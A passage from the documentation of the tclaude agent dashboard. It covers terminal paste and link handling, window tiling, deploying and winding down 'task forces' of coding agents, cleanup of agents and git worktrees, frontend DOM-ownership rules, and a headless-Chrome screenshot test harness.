text independently of its target, hovering one shows the real destination in
the terminal's status line before you commit to the click. OSC 8 `file://`
links and absolute-path targets are downloads: Ctrl/⌘-click asks the
authenticated agentd backend to preflight and then stream that host-local
regular file to the browser. This works from a remote dashboard, where the
browser cannot dereference the agent host's path itself; remote-host file URLs,
directories, and devices stay blocked. When a harness only colours a visible
absolute path without emitting OSC 8 metadata, the terminal recognizes that
path directly and gives it the same download behavior. Relative labels remain
plain because they do not identify a host file without the terminal's working
directory.
Pasting a PNG, JPEG, or WebP clipboard image uploads it to a bounded temporary
directory on the agentd host and pastes that host-side path into Claude Code or
Codex as an image attachment. This also works through remote dashboard
access—the image bytes come from the browser rather than agentd's OS clipboard. Browser paste
shortcuts (**Ctrl-V**, **Ctrl-Shift-V**, **⌘-V**, and **⌘-Shift-V**) stay
in the browser on every platform rather than being forwarded to the remote TUI.
Text continues through xterm's ordinary paste event, while images take the
upload path above; Codex never tries to read the agentd host's desktop clipboard
for a web-terminal paste.

The **Window focus** field also holds a **set the `tclaude:<id>` window/tab
title** toggle (`focus.window_title`, on by default). tclaude normally stamps
a `tclaude:<id>` title on each agent's terminal so it can find that window
again to **raise** (focus) or **auto-tile** it. Some find the title ugly on a
plain desktop terminal — unchecking it leaves the terminal's own tab title
alone. The trade-off: focus and tiling can no longer locate the window, so
"focus" falls back to opening a *new* window instead of raising the existing
one (this affects WSL and native-Linux/X11; the explicit **open window**
action is unaffected). **Leave it on for WSL**, where window focus depends on
the title.

The **Window focus** field also holds an opt-in **auto-tile** toggle: when
on, focusing/​showing more than one native agent window (the 🪟 windows… modal or
the command palette) rearranges that set into a tidy layout — `grid`
(default), `columns`, `rows`, or `cascade` — instead of leaving each window
where the OS dropped it, with configurable inter-tile **gap** and screen-edge
**margin**. All windows are gathered onto **one monitor** — the one the first
window is on — so a multi-monitor setup isn't scattered across screens. By
default windows keep their **current size** and are only repositioned; tick
**resize windows to fill the screen** for the older screen-filling grid. It is
best-effort per platform (macOS AppleScript, Linux xdotool/kdotool, WSL
PowerShell); an unsupported desktop simply leaves the windows as-is. A single
focused window is never tiled.

## Task forces

A **task force** is a whole agent team deployed from a [template](#templates)
against a **mission** — a topic, problem, or epic. The journey runs in order:
pick a template → deploy it against a mission → watch and steer the live force
on its group → wind it down when the work is done. (The
[CLI](agent.md#task-forces-cli) drives the same journey headlessly.)

### Concepts: pattern, process & rhythms

Three things shape a deployed force, and they work **together**:

- the **work pattern** (*rite of command* in wizard mode) **briefs it once** —
  an ordered list of routed messages delivered a single time, after the whole
  team has spawned. It fires at deploy and does not repeat, but
  [Re-brief](#steering-a-force) re-delivers the template's *current* pattern
  to the live team on demand.
- the **process** (*quest plan*) gives it a **shared map of phases** to advance
  through. It is **advisory**: advancing records a transition and nudges the
  roles now active — nothing is blocked, no permissions change, nothing
  auto-advances.
- the **rhythms** (*drumbeats*) **keep it moving between phases** — recurring
  nudges materialized as group cron jobs at deploy (a **snapshot**; editing the
  template afterwards does not retune a force already in the field, see
  [The rhythm model](#the-rhythm-model)).

| Concept | Delivered | Repeats? | Enforced? | On stand-down |
|---|---|---|---|---|
| Work pattern | once, after the team is up | no — re-brief re-sends on demand | no — it is a briefing | already delivered (nothing to sweep) |
| Process | snapshot at deploy | advance by hand | no — advisory | phase history kept |
| Rhythms | cron jobs at deploy | yes, on a schedule | no — nudges | cron jobs deleted |

The template editor carries the same summary in a collapsible **“How deploying
works”** panel above its pattern / process / rhythms sections.

### Deploying a force

A template card's **🚀 deploy** button opens the deploy modal: pick the
template, state the **mission** (free text, or a Linear epic / issue link — it
is stored verbatim, tclaude pulls no title), and optionally set a working
directory and a **worktree** branch. The mission is folded into the new group's
shared context under a `## Mission` heading, so every spawned agent's startup
briefing carries it.

The **group name** is derived from the mission (slugged and made unique) and
pre-fills the field as you type; a bare-URL mission has no words to slug, so it
falls back to the template name. Type over the field to name the group
yourself. The group name is also the prefix for every agent — template agent
`PO` lands as `<group>-PO` (the modal previews the final names). The optional
**worktree** branch lands the whole force on its own branch in a git worktree,
which becomes the force's working directory. **Give each agent its own
worktree** instead fans that branch prefix out across the roster. A template
may pre-check this choice by default; changing it in the deploy modal affects
only that spawn and does not edit the template.

When creating a new force, the modal can also **mirror settings from an existing
group**: description and default cwd are copied into editable fields before
submit, and the startup context field shows the mirrored group's context
combined with the template's default context. Leave it top-level to create a
separate force with the same settings, or tick **Deploy as subgroup** to nest
the new force under the mirrored group. Dragging a template from the right dock
onto a group offers the same choices plus **Reinforce this group**, which keeps
the existing group and spawns the template roster directly into it.

Deploying does several things in one action:

- creates the fresh group (top-level or nested), recording the mission and the
  source template on it (this is what marks the group a *deployed force*);
- spawns **wave 0** synchronously, so the modal returns with real per-agent
  outcomes, and **defers** any higher waves to a background runner that spawns
  each as the previous wave settles (goes idle) or a max-wait backstop fires;
- **materializes the template's rhythms** as ordinary group cron jobs, armed
  the moment the team comes up (see [The rhythm model](#the-rhythm-model));
- **seeds the process** state at the first phase, if the template has one;
- delivers the template's **work pattern** — the ordered briefing messages —
  once the whole roster has spawned (immediately for a single-wave force, after
  the final wave settles for a staged one).

**⎘ instantiate** on the card is the same machinery without the mission framing
(no `## Mission`, no derived name — you name the group). Deploy is the
mission-framed twin; both spawn the whole team.

### The force block

Expand a deployed force's group on the Groups tab and its body leads with a
**force block** — a live glance at the deployment:

- the **mission** (labelled 🎯 Mission, or 🗺 Quest in wizard mode) and the
  **source template** it was deployed from. A force deployed with no mission
  reads "Deployed from template *X* — no mission recorded" instead.
- a **phase line** (◆ phase *N/M: name*) with a **history (*N*)** affordance;
  hover it for the transition log. Absent for a force with no process.
- a per-role **liveness rollup** — members grouped by role, each a pill showing
  a status glyph (● working, ○ idle, ✕ dead) and its context-window pressure
  (e.g. `62%`) when the snapshot carries it.
- a **⚠ stalling** hint next to the Roles heading. It fires **only when every
  live member is idle** — a conservative "nothing appears to be in flight"
  glance. A fully-offline force is dormant, not stalling, so the hint stays off
  when no member is live.
- a **↻ re-brief** button and a **⏻ stand down** button (see below).

The group's **summary line** also carries a **◆ phase** chip (with a **▸
advance** button when a next phase exists) and a **🌊 wave *N/M* pending** chip
while later waves are still deferred. Advancing lives on the summary chip and
retiring lives in the group's ⚙ cog, so the force block does not duplicate them.

This whole block has a CLI twin: **`tclaude agent task-force status <group>`**
prints the same mission, phase map, liveness rollup, waves and rhythms
headlessly (and **`task-force ls`** lists every deployed force) — see
[Task forces (CLI)](agent.md#task-forces-cli). The liveness classification is
shared, so the terminal and the dashboard never disagree about who is stalling.

### Steering a force

- **Advance the process.** The **▸ advance** button on the phase chip moves the
  group to the next phase, records the transition, and nudges the roles active
  in the phase it enters. The process is **advisory** — tracked and surfaced,
  never enforced. Advancing is gated server-side (the human always, group owners
  of the group, otherwise the `process.advance` slug); a non-permitted click
  just gets a 403 toast.
- **Re-brief.** **↻ re-brief** re-delivers the source template's **current**
  work pattern to the force's live members, with the group's recorded mission
  interpolated (`{{mission}}` / `{{task}}`). Reach for it when the roster has
  drifted or the original briefing has scrolled out of context. It is gated on
  the human, group owners, or the **`templates.instantiate`** slug. A force with
  no source template, a deleted template, or a template with no work pattern is
  refused cleanly (nothing is sent).
- **Stand down.** **⏻ stand down** winds the whole force down — the mirror of
  deploy (see [Winding a force down](#winding-a-force-down)). It is gated on the
  human, group owners, or the **`groups.members.retire`** slug.

### The rhythm model

A template's rhythms are a **deploy-time snapshot**. At deploy each rhythm is
materialized into an ordinary group cron job (named `<group>-<rhythm>`) and from
that point on the two are independent:

- **editing the template later does *not* change already-deployed jobs**, and
- **re-brief does *not* re-sync them** — re-brief only re-delivers the work
  pattern, never the rhythms.

To change a running force's cadence, edit its jobs directly in the **Cron** tab.
This is deliberate: a deployed force's live cron schedule is its own state, not a
mirror of the blueprint it came from.

### Winding a force down

Three verbs, with different blast radii:

- **Retire** (per-member status dot / the group ⚙ cog, or `groups retire`) is
  **non-destructive**: it demotes agents to plain conversations. The group and
  its history survive, and a retired conversation can be reinstated. Generated
  agent-owned cache directories are discarded; they are recreated empty if the
  agent is later reinstated and resumed.
  - When a retire leaves the group with **no live members**, its group-target
    rhythms would otherwise keep firing every interval to nobody. So a retire
    that empties the group **auto-disables** those cron jobs (they stay visible
    and reversible in the **Cron** tab, marked *group-retired*) rather than
    leaving them running. A later **`groups resume`** on the group **re-enables
    exactly** the jobs that auto-disable turned off — never a job you paused by
    hand (once you flip a job's enabled state yourself, it stops being a
    candidate for the auto-re-enable).
- **Stand down** (the force block's **⏻ stand down** button, or
  `task-force stand-down`) is the **mirror of deploy** — the composed wind-down.
  It **retires the whole roster** *and* **sweeps** (deletes) the deploy-seeded
  runtime: the group-target **rhythm cron jobs** and any pending **wave
  choreography**. It **keeps the group row** as a dormant record — the mission,
  provenance, and process history all survive — so it is *not* a delete. Reach
  for it when a mission is done and you want the force wound down but its record
  kept. Gated on the human, group owners, or `groups.members.retire`.
- **Delete group** (the group ⚙ cog, or `groups rm`) is the **full sweep**: it
  removes the group and, in one transaction, its advisory **process state** and
  transition log, its staged-spawn **wave choreography**, and its group-target
  **cron jobs** (including the template-seeded rhythms). What each member *said*
  to the others is preserved as direct messages, and cron jobs that merely
  routed *through* the group (conv-targeted) still deliver and are left alone.

The difference between **stand down** and **delete group**: stand-down sweeps the
same rhythms + waves but **keeps the group** (mission and history preserved);
delete erases the group row entirely.

## Spawning agents from the dashboard

A group header's **+ spawn agent** button opens the spawn modal: name, role,
description, an optional **initial message** (a task brief delivered to the new
agent's inbox), and a working-directory field with a git-worktree picker. The
group's start-dir default pre-fills the directory when present, and — when the
group has a shared startup context — a checkbox offers to include it in the
briefing.

The modal also takes **attachments**, added three ways: click **📎 Attach
files** to pick one or more with the native picker; **drag files from
Finder/Explorer** onto the dialog (it highlights as a drop target); or **paste**
(⌘/Ctrl-V anywhere in the dialog) — a clipboard screenshot is packaged as a PNG,
and a file copied in Finder/Explorer (⌘/Ctrl-C) is attached as-is. Each pending
attachment shows in a list with a thumbnail (for images) and a remove button.
On submit the files are uploaded to a temp dir (`POST /api/spawn-attachments`)
and their paths are folded into the new agent's startup briefing under an
"Attached files" heading, so the agent can open them with its own file tools on
its first turn. Attachments are per-spawn — they aren't stored in a spawn
profile — and the temp copies are swept after a day.

The modal has an **Auto focus** checkbox (default on): when checked, it opens a
terminal attached to the freshly-spawned session so you can watch and talk to
the new agent immediately. It uses `tclaude session attach`, preserving the
status bar and focus/notify wiring. With **Default terminal** set to web, the
terminal opens as a pane in the dashboard's **Terminals** tab; otherwise it
opens a native terminal window. A detached spawn otherwise has no window of its
own.

For OpenCode, the modal also shows **Tool governance** with `allow`, `ask`, and
`deny`. It applies one action to bash, glob, grep, LSP, task, and skill while
the launch uses `access-control`; `allow` is the backward-compatible default.
The selector is hidden for Claude Code and Codex, which do not expose this
independent axis. OpenCode's explicit sandbox `off` posture remains off, so this
selector does not claim to govern those tools in that mode.

## Cleanup

Long-running coordination sessions accumulate dead agents — exited workers,
abandoned experiments. The **🧹 cleanup** affordances bulk-prune them.

Two entry points, both on the Groups tab:

- **Per group** (group header → 🧹 cleanup) — removes confirmed-offline
  *members* from that one group. The conversations keep running and stay on
  disk; only the membership is dropped.
- **All categories** (Groups tab filter bar → 🧹 clean up) — the rich modal.
  It spans three conversation categories — active agents, retired agents, and
  plain conversations — and offers four tiers. Active agents with no real
  group are included explicitly as **Ungrouped** (or **Unbound** in wizard
  mode); the title / id / group filter finds them by either name.

  | Tier        | Acts on                                                            |
  |-------------|--------------------------------------------------------------------|
  | `unjoin`    | active agents — drop their group memberships                       |
  | `retire`    | active agents — demote to a plain conversation                     |
  | `delete`    | any conversation — wipes history from disk, drops every group / owner / permission row |
  | `reinstate` | retired agents — return them to the active roster                  |

  A target whose tier doesn't apply is reported *skipped*, never *failed*, so
  a mixed-category selection degrades gracefully.

The command palette also offers **Cleanup worktrees across all groups**. It
scans the union of every group's default directory and member worktree history,
deduplicates groups that share a repo, and opens the same explicit-selection
preview as each group header's **cleanup worktrees…** action. The global
**🧹 clean up** modal links to this preview too, under its agent cleanup
options. For checkout rows, Git's registered worktree list is authoritative:
linked worktrees
remain cleanup candidates when their directory was deleted out-of-band or
their HEAD is detached. Cleanup removes those registrations through the
surviving main checkout; detached entries have no branch to delete.

Git may also retain older `.git/worktrees` bookkeeping whose `gitdir` is
missing or broken. Those records are structurally absent from `git worktree
list`, so the preview discovers them separately with `git worktree prune`'s
dry-run and shows one pre-selected **bookkeeping only** row per affected repo.
The disclosure on that row groups Git's reasons; its count is a live scan, not
durable inventory. Pruning these records cannot remove a checkout directory or
branch. A prune candidate that Git still exposes as a checkout row stays in
the existing per-worktree selection flow; tclaude temporarily locks such rows
and every other listed linked worktree during repo pruning so a concurrent
checkout disappearance cannot let the aggregate action bypass an unticked
agent-bound or otherwise protected row. A later scan recovers any tclaude-owned
temporary lock left by an interrupted prune. After pruning, tclaude repeats
the dry-run and reports the verified
number cleared and remaining instead of trusting Git's exit code. In
particular, an active agent sandbox can hold bind mounts on the administrative
entries: Git may then report failures while exiting successfully, and the
dialog reports the remaining records as failed/partial with retry guidance.

The palette's status-filtered retire shortcuts cover the same complete roster.
For both **idle** and **offline** agents it offers a command for each real
group, one for the virtual **Ungrouped** group, and a separate global command
across all groups (including Ungrouped). Each opens an explicit-selection
preview before retiring anything. In wizard mode these commands use
**Banish**, **familiars**, **parties**, and **Unbound**.

The idle/offline status is captured when the preview opens. The checked roster
is then exact: a checked agent remains selected if it resumes or starts working
before submit, and is retired only if it remains checked. This intentionally
differs from the rich cleanup modal's default online-session guard below.
The global preview also shows every selected agent's current group memberships;
agents with none are labelled **Ungrouped** (or **Unbound** in wizard mode).

The modal lists the affected agents as an editable include/exclude checklist,
with an "inactive ≥ N h" quick-filter for picking by staleness. Nothing is
trusted blindly: **the daemon re-checks tmux liveness for every agent at
execute time**, so one that came back online between the snapshot and your
click is reported *skipped*, never touched. After running, the modal shows a
per-agent outcome log.

**Owners.** Offline group owners are excluded by default. Tick **include
offline owners** to remove them too — that also strips their owner status. A
group left with no owners is flagged with a warning.

**Worktrees.** When cleanup *deletes* an agent (and likewise the per-row
**delete** button), it offers to also remove the git worktree that agent was
working in. The worktree *directory* is removed; its **branch and commits are
kept**. Two worktrees are always spared: the repo's **main** worktree, and any
worktree another, surviving agent is still working in (a "shared" worktree).
For a single delete the checkbox is greyed out and labelled when the worktree
can't be removed; an already-deleted worktree is a silent no-op.

The broader worktree preview also finds clean or dirty orphan worktrees and
leftovers belonging to retired agents. Clean orphans and clean retired-agent
worktrees are preselected; dirty, live-agent, and still-enrolled-agent rows are
left for review. The main repo is never selectable, and every chosen path is
revalidated against live agent state immediately before removal.

Cleanup is **human-only** — these endpoints live on the loopback dashboard
server behind the same cookie + Origin pinning as every other mutation; agents
on the `/v1` socket have no path to them.

## Frontend ownership and imperative boundaries

Preact is the default owner for operator-facing markup, drafts, validation,
busy/error state, dialogs, lists, and forms. Static dashboard HTML may provide
an empty stable host, but it must not contain a second dialog implementation.
Snapshot polling and reconciliation must not inspect UI draft state or pause
because an editor is open. Cross-feature `data-act` routing snapshots an
immutable plain descriptor before starting an operation; DOM attributes are
not request or application state.

Imperative code remains only at the following explicit boundaries. A module
that directly creates or injects DOM carries a
`dashboard-imperative-boundary` marker naming one of these categories; the
architecture test discovers markers rather than maintaining a filename
allowlist.

| Marker / surface | Ownership | Lifetime and disposal | Behavioral test expectation |
|---|---|---|---|
| xterm terminal core | Preact owns terminal tabs, shells, and stable hosts; xterm owns only the opaque descendants handed to `terminals-core.js`. | Terminal close/unmount disposes the terminal, addons, socket, resize observer, and listeners. Reconciliation may retain or retire a host but never rebuild xterm children. | Mount/close/pop-out and roster reconciliation tests must prove opaque-node identity and teardown. |
| `process-graph` | Preact owns editor/dialog state; `process-graph.js` and `process-graph-adapter.js` exclusively own their SVG/canvas-like host. The connector-drop `process-node-chooser.js` owns its anchored combobox/listbox subtree. | The adapter removes pointer/key listeners, connection bands, and graph instances on keyed replacement/unmount. Closing or disposing the chooser removes its document listener and subtree; cancellation restores focus, while unmount disposal leaves focus to the next owner. | Graph interaction tests cover selection, drag/connect, rerender identity, and disposal; chooser tests cover selection, cancellation, focus, click-away, and idempotent disposal. |
| `cost-chart` | Preact owns filters, data derivation, and the chart host; `costs-chart.js` owns the chart's drawing nodes only. | Each effect clears/replaces the chart host and returns cleanup before the next draw or unmount. | Costs tests cover filtered redraw, empty/error states, and chart cleanup without asserting incidental node layout. |
| drag and drop | Preact emits live keyed producers and semantic `data-*` descriptors; `dnd.js`, `group-reorder.js`, `dock-dnd.js`, and `dock-save-dnd.js` adapt native `DataTransfer` events. | Every binder is idempotent, returns cleanup, resets gesture state on `dragend`/unmount, and rejects detached producers. | DnD tests cover copy/move/delete intent, cancellation, cleanup, and live-source guards. |
| `media-effects` | The Vegas audio player and slop/wizard cosmetic modules are boot-time, page-lifetime effects that own media elements, particles, and the explicitly opaque reel host. They do not own operational state. | Their delegated document listeners intentionally live until navigation and are not `pageCleanups`. Within that page lifetime, transient nodes self-remove, Vegas stops audio and polling timers when inactive, and identity tokens prevent stale timers from overwriting a newer Preact host. | Reduced-motion, stale-timer, inactive-audio, and opaque reel hand-back tests are required. |
| `platform-layout` | Scoped browser effects own focus traps, resize, horizontal scroll, navigation history, overlay stacking, and stable shell/dock re-homing. The dashboard profile controls are Preact-owned inside named stable hosts; the hosts move between the toolbar and dock while each chip can turn into an inline picker. `island-lifecycle.js` owns only its claimed host's load-failure alert. | Effects attach to refs/stable shell nodes and return cleanup. Focus returns to the remounted chip after keyboard cancellation. Island failure rendering replaces only the claimed host; successful cleanup releases host ownership. | Binder lifecycle, inline-picker focus, overlay stack, dock identity, refresh-generation, and island rollback/ownership tests cover these contracts. |
| `browser-io` | Operation modules may create a short-lived download anchor, clipboard textarea fallback, or standalone Preact host solely to invoke a browser API. `xterm-loader.js` owns the non-visual script node used to fetch the classic xterm runtime on first valid terminal intent. | Temporary operation nodes and object URLs are removed/revoked in the same operation; no draft or request state is stored on them. The xterm script and installed global intentionally live for the page lifetime, while an in-flight promise deduplicates concurrent opens and a failed load is retryable. An auth-aware HEAD preflight preserves the dashboard's expired-session redirect before script injection. | Payload/download/clipboard tests assert the invoked browser contract and cleanup. The xterm loader test proves imports cause no fetch, auth failure causes no injection, concurrent requests append one script, and a ready runtime is reused; facade tests prove canceled/invalid requests do not prepare it. |
| `config-adapter` | `config-form-adapter.js` and `remote-admin.js` are bounded adapters for server-described native controls embedded in Preact-owned config surfaces. | Activation is generation-guarded; option/list replacement is scoped to the supplied control, and the Config island owns activation cleanup. | Config activation and retry tests must prove stale loads cannot publish into a replacement control. |
| `preact-compat` | Preact remains the visual owner. This marker covers trusted legacy readback HTML and standalone process-dialog wrappers used outside the main editor tree, not permission to build new imperative UI. | Injected markup is escaped/trusted at its model boundary; standalone hosts unmount Preact and remove themselves on completion. | Readback escaping and standalone-dialog close/disposal tests are required. New uses need explicit review and documentation here. |

One surface sits just inside that allowance and is worth naming, because it
reads at a glance like an exception: `menu-filter.js`, the type-to-filter core
behind the ⚙ cog menus, decides which items a query keeps by **reading the
rendered menu** rather than from data. It is not new imperative UI — it creates
no nodes, and Preact still owns the box, the query and every item — but it does
mark items on a Preact-rendered subtree. Two properties keep that safe. Its
three `data-menu-*` attributes are declared by no vnode, so Preact never diffs
them and a snapshot publish cannot fight them; and `ActionMenu` re-applies the
filter after every render, so items that appear or disappear with the snapshot
are re-evaluated. Reading the DOM is also the only complete option here: several
items (`NotifyMenuItem`, `RemoteMenuItem`, `RestartMenuItem`,
`SandboxRestartMenuItem`) compute their own label inside the component from live
member state, so no call site knows what they say — and matching the rendered
text means the filter cannot drift from the labels the operator can see.

The guard intentionally allows ordinary ref-based effects (`focus`, measure,
scroll, browser APIs) and rejects undocumented DOM ownership. If a new surface
needs imperative ownership, first prove that Preact cannot own the ordinary UI,
add a documented category/lifecycle/test contract, and then add the source
marker. Do not solve a guard failure with a compatibility re-export, static
dialog markup, or a blanket filename exception.

## Visual smoke testing

The manually-run DashSnap harness drives a real headless Chrome through the
dashboard's state matrix and writes screenshots plus an HTML contact sheet under
`dashsnap-out/`. It is opt-in and is not part of CI.

The matrix has grown large (every state × both skins — a couple of hundred
screenshots), and its per-state settle waits alone add up to several minutes, so
a full run takes on the order of ten minutes. The canonical invocation therefore
shards the matrix: `TCLAUDE_DASHSNAP_SHARD=i/n` deterministically assigns every
n-th state (round-robin over the filtered matrix, so the shards stay balanced
and together cover everything) to shard `i`. Four shards keep each command to a
few minutes:

```bash
for s in 1 2 3 4; do
  TCLAUDE_DASHSNAP=1 TCLAUDE_DASHSNAP_SHARD=$s/4 go test ./pkg/claude/agentd/ \
    -run TestDashSnap -v -count=1 -timeout 600s
done
```

Each shard writes its own `dashsnap-out/<timestamp>-shard<i>of<n>/` directory
with per-state pass/fail, per-state capture timings (also shown on the contact
sheet, so budget drift stays visible), and its own `index.html`. To capture
everything in a single command instead, drop the shard variable and raise the
timeout to cover the whole matrix:

```bash
TCLAUDE_DASHSNAP=1 go test ./pkg/claude/agentd/ \
  -run TestDashSnap -v -count=1 -timeout 1800s
```

Set `TCLAUDE_DASHSNAP_FILTER=groups-chip-keyboard` (or another state-key
substring) before the command to capture a subset; sharding applies after the
filter, and a shard left empty by a narrow filter skips cleanly (its states all
belong to lower-numbered shards), so the fixed four-shard loop combines with
any filter. Set `TCLAUDE_DASHSNAP_CHROME=/path/to/chrome` when Chrome is not in
a usual platform install location.

`TestDashSnapSandboxPreviewOverflow` rides along with those commands (the name
shares the `TestDashSnap` prefix, and it honours the same filter/shard
variables). It is a measuring smoke rather than a screenshot matrix: it opens
the real sandbox-profile editor on a wide network policy, expands every
effective-policy-preview bucket, and hard-fails unless the editor overlay,
card, preview section and every bucket measure 0px horizontal overflow with no
clipped labels, at 1280px and 720px in both skins. Page-level overflow is
deliberately not asserted — the shell scrolls sideways by design (see the
`.bar-inner` note in `dashboard.css`).

Behind the same env gate, two functional real-browser smokes cover the
terminal shells: `TestDashboardTerminalRevealFocusChrome` (tab-reveal keyboard
focus) and `TestDashboardTerminalShellLiveChrome`, which drives a live
end-to-end terminal session — browser xterm ↔ WebSocket ↔ a deterministic
server PTY — across reveal/refocus, typing, copy, kill → reconnect, the
modal's detach/close confirmation, pop-out to `/terminals?solo=1`, reattach to
the opener dashboard, fit/resize, and exact-once teardown:

```bash
TCLAUDE_DASHSNAP=1 go test ./pkg/claude/agentd/ \
  -run TestDashboardTerminalShellLiveChrome -v -count=1 -timeout 300s
```

All of these smokes SKIP (rather than fail) when no usable local
Chrome/Chromium can be found or launched, so an environment gap is never
mistaken for a dashboard regression; once a browser is up, any failed state is
a real product failure.

On Linux, the harness launches Chrome with `--no-sandbox` and redirects
`XDG_CONFIG_HOME`, `XDG_CACHE_HOME`, and `XDG_DATA_HOME` to its disposable
browser directory. Chrome's crashpad database does not follow
`--user-data-dir`; without the XDG config redirect, a read-only `~/.config`
causes Chrome to abort with `chrome_crashpad_handler: --database is required`.
The disposable directory is removed after Chrome exits. For a direct headless
Chrome invocation outside DashSnap, point those XDG variables at a writable
temporary directory as well.

On macOS, the harness also points `MAC_CHROMIUM_TMPDIR` at a disposable,
writable directory unless that variable is already set. That avoids Chromium's
otherwise hard-coded user-temp socket path, but it cannot bypass a seatbelt
sandbox that denies `mach-register`:
Chrome's multi-process startup requires the
`com.google.Chrome.MachPortRendezvousServer.*` service. A sandboxed macOS agent
must therefore ask the operator to run the command outside the agent sandbox,
or run the harness in a Linux environment. This is an OS sandbox capability
boundary, not a filesystem permission that another writable-directory grant can
fix.

## See also

- [Agent Coordination](agent.md) — the `tclaude agent` CLI, `agentd`, groups,
  permissions, and the approval popup the dashboard shares a port with.
